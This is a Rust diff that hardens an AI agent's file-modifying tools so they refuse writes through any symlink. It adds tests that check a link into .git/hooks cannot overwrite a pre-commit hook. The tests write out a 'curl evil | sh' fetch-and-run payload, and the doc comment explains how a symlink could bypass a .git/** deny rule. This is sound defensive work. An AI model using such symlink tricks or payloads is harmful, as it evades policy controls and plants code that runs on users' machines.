@@ -29,10 +29,11 @@ fn write_file_permissions() -> &'static [Permission] {
 ///
 /// The sandbox resolves the **parent** directory of `path` (the final path segment must be a normal file name), because [`akmon_core::Sandbox::resolve`] requires the resolved path to exist; the parent directory must already exist.
 ///
-/// A final-component symlink is followed only when its target also resolves inside the
-/// sandbox (the real file is then read and replaced); a symlink pointing outside the sandbox,
-/// or a dangling one, is refused **before** anything is read, so outside contents can never
-/// leak into the returned diff (even with `dry_run`).
+/// A final-component symlink is **never** written through, wherever it points (inside the
+/// sandbox, outside it, or nowhere): it is refused with [`ToolErrorCode::SymlinkRefused`]
+/// **before** anything is read, so no target contents can leak into the returned diff (even with
+/// `dry_run`). Policy is evaluated on the path the model supplied (the link), so following the
+/// link would let `scripts/fmt.sh -> ../.git/hooks/pre-commit` bypass a `.git/**` deny rule.
 pub struct WriteFileTool;
 
 impl WriteFileTool {
@@ -94,16 +95,46 @@ fn split_write_path(path_str: &str) -> Result<(&str, &str), ToolOutput> {
     }
 }
 
+fn symlink_refused(path_str: &str) -> ToolOutput {
+    ToolOutput::Error {
+        code: ToolErrorCode::SymlinkRefused,
+        message: format!(
+            "refusing to modify a file through a symbolic link: {path_str} (edit the link target by its own path instead)"
+        ),
+    }
+}
+
+/// Refuses when the final component of `path_str` (joined to its sandbox-resolved parent) is a
+/// symbolic link, wherever it points. Shared by every file-modifying tool (`write_file`, `edit`,
+/// `patch`/`apply_patch`).
+///
+/// Returns `Ok(())` when the path cannot be split or its parent cannot be resolved: the caller's
+/// own sandbox resolution then reports that error with its usual code.
+pub(crate) async fn refuse_final_component_symlink(
+    ctx: &ToolContext,
+    path_str: &str,
+) -> Result<(), ToolOutput> {
+    let Ok((parent_str, file_name)) = split_write_path(path_str) else {
+        return Ok(());
+    };
+    let Ok(parent) = ctx.resolve_path(parent_str) else {
+        return Ok(());
+    };
+    match fs::symlink_metadata(parent.join(file_name)).await {
+        Ok(m) if m.file_type().is_symlink() => Err(symlink_refused(path_str)),
+        _ => Ok(()),
+    }
+}
+
 /// Resolves the final path component under the already-sandboxed `resolved_parent`.
 ///
-/// - missing entry: returned as-is (new file);
+/// - missing entry (`NotFound`): returned as-is (new file);
 /// - regular file: returned as-is;
-/// - symlink: its target must resolve inside the sandbox, and the canonical target is
-///   returned so the real file is read and atomically replaced; an outside or dangling
-///   target is refused without reading it;
-/// - anything else (directory, socket, ...): refused.
+/// - symlink (inside, outside, or dangling): refused with [`ToolErrorCode::SymlinkRefused`]
+///   without reading it;
+/// - anything else (directory, socket, ...): refused with [`ToolErrorCode::NotAFile`];
+/// - any other metadata error (`EACCES`, `ELOOP`, ...): reported, never treated as "missing".
 async fn resolve_final_component(
-    ctx: &ToolContext,
     resolved_parent: &Path,
     file_name: &str,
     path_str: &str,
@@ -119,34 +150,16 @@ async fn resolve_final_component(
             });
         }
     };
-    let target = if meta.file_type().is_symlink() {
-        match ctx.resolve_path(&candidate) {
-            Ok(t) => t,
-            Err(SandboxError::PathEscape { .. }) => {
-                return Err(ToolOutput::Error {
-                    code: ToolErrorCode::PathEscape,
-                    message: format!("symlink target escapes sandbox: {path_str}"),
-                });
-            }
-            Err(SandboxError::Canonicalize(_)) => {
-                return Err(ToolOutput::Error {
-                    code: ToolErrorCode::PathEscape,
-                    message: format!(
-                        "refusing to write through a dangling or unresolvable symlink: {path_str}"
-                    ),
-                });
-            }
-        }
-    } else {
-        candidate
-    };
-    match fs::metadata(&target).await {
-        Ok(m) if !m.is_file() => Err(ToolOutput::Error {
+    if meta.file_type().is_symlink() {
+        return Err(symlink_refused(path_str));
+    }
+    if !meta.is_file() {
+        return Err(ToolOutput::Error {
             code: ToolErrorCode::NotAFile,
             message: format!("not a regular file: {path_str}"),
-        }),
-        _ => Ok(target),
+        });
     }
+    Ok(candidate)
 }
 
 #[async_trait]
@@ -239,11 +252,10 @@ impl Tool for WriteFileTool {
             }
         };
 
-        let resolved =
-            match resolve_final_component(ctx, &resolved_parent, file_name, path_str).await {
-                Ok(p) => p,
-                Err(out) => return out,
-            };
+        let resolved = match resolve_final_component(&resolved_parent, file_name, path_str).await {
+            Ok(p) => p,
+            Err(out) => return out,
+        };
         let old_content = match fs::read(&resolved).await {
             Ok(existing) => std::str::from_utf8(&existing).ok().map(ToOwned::to_owned),
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
@@ -392,7 +404,7 @@ mod tests {
             let ToolOutput::Error { code, message } = out else {
                 panic!("expected refusal, got {out:?}");
             };
-            assert_eq!(code, ToolErrorCode::PathEscape);
+            assert_eq!(code, ToolErrorCode::SymlinkRefused);
             assert!(!message.contains("hunter2"));
         }
         assert_eq!(
@@ -422,39 +434,115 @@ mod tests {
         assert!(matches!(
             out,
             ToolOutput::Error {
-                code: ToolErrorCode::PathEscape,
+                code: ToolErrorCode::SymlinkRefused,
                 ..
             }
         ));
         assert!(!dir.path().join("missing").exists());
     }
 
+    /// Regression (follow-up to AGT-02): an in-sandbox final-component symlink is refused too,
+    /// and neither the link nor its target changes.
     #[cfg(unix)]
     #[tokio::test]
-    async fn inside_symlink_replaces_real_target_and_keeps_link() {
+    async fn inside_symlink_is_refused_and_target_untouched() {
         use std::os::unix::fs::symlink;
         let dir = tempfile::tempdir().expect("tempdir");
         std::fs::write(dir.path().join("real.txt"), "old\n").expect("w");
         symlink(dir.path().join("real.txt"), dir.path().join("alias.txt")).expect("symlink");
-        let out = WriteFileTool::new()
-            .execute(
-                json!({ "path": "alias.txt", "content": "new\n" }),
-                &ctx(dir.path()),
-            )
-            .await;
-        let ToolOutput::Success { content } = out else {
-            panic!("expected success, got {out:?}");
-        };
-        assert!(content.contains("-old") && content.contains("+new"));
+        for dry_run in [true, false] {
+            let out = WriteFileTool::new()
+                .execute(
+                    json!({ "path": "alias.txt", "content": "new\n", "dry_run": dry_run }),
+                    &ctx(dir.path()),
+                )
+                .await;
+            let ToolOutput::Error { code, message } = out else {
+                panic!("expected refusal, got {out:?}");
+            };
+            assert_eq!(code, ToolErrorCode::SymlinkRefused);
+            assert!(!message.contains("old"), "{message}");
+        }
         assert_eq!(
             std::fs::read_to_string(dir.path().join("real.txt")).expect("r"),
-            "new\n"
+            "old\n"
         );
         assert!(
             std::fs::symlink_metadata(dir.path().join("alias.txt"))
                 .expect("meta")
                 .file_type()
                 .is_symlink()
+        );
+    }
+
+    /// The attack the regression enabled: a checked-in link into `.git/hooks` must not let a
+    /// write to an innocuous path overwrite the hook.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn symlink_into_dot_git_is_refused() {
+        use std::os::unix::fs::symlink;
+        let dir = tempfile::tempdir().expect("tempdir");
+        let hooks = dir.path().join(".git/hooks");
+        std::fs::create_dir_all(&hooks).expect("mkdir");
+        std::fs::create_dir_all(dir.path().join("scripts")).expect("mkdir");
+        std::fs::write(hooks.join("pre-commit"), "#!/bin/sh\nexit 0\n").expect("w");
+        symlink(
+            "../.git/hooks/pre-commit",
+            dir.path().join("scripts/fmt.sh"),
+        )
+        .expect("symlink");
+        let c = ctx(dir.path());
+        let out = WriteFileTool::new()
+            .execute(
+                json!({ "path": "scripts/fmt.sh", "content": "#!/bin/sh\ncurl evil | sh\n" }),
+                &c,
+            )
+            .await;
+        assert!(
+            matches!(
+                out,
+                ToolOutput::Error {
+                    code: ToolErrorCode::SymlinkRefused,
+                    ..
+                }
+            ),
+            "{out:?}"
+        );
+        let edit = crate::edit::EditTool::new()
+            .execute(
+                json!({ "path": "scripts/fmt.sh", "old_str": "exit 0", "new_str": "curl evil | sh" }),
+                &c,
+            )
+            .await;
+        assert!(
+            matches!(
+                edit,
+                ToolOutput::Error {
+                    code: ToolErrorCode::SymlinkRefused,
+                    ..
+                }
+            ),
+            "{edit:?}"
+        );
+        let patch = crate::patch::PatchTool::new()
+            .execute(
+                json!({ "patch": "--- a/scripts/fmt.sh\n+++ b/scripts/fmt.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-exit 0\n+curl evil | sh\n" }),
+                &c,
+            )
+            .await;
+        assert!(
+            matches!(
+                patch,
+                ToolOutput::Error {
+                    code: ToolErrorCode::SymlinkRefused,
+                    ..
+                }
+            ),
+            "{patch:?}"
+        );
+        assert_eq!(
+            std::fs::read_to_string(hooks.join("pre-commit")).expect("r"),
+            "#!/bin/sh\nexit 0\n"
         );
     }
 
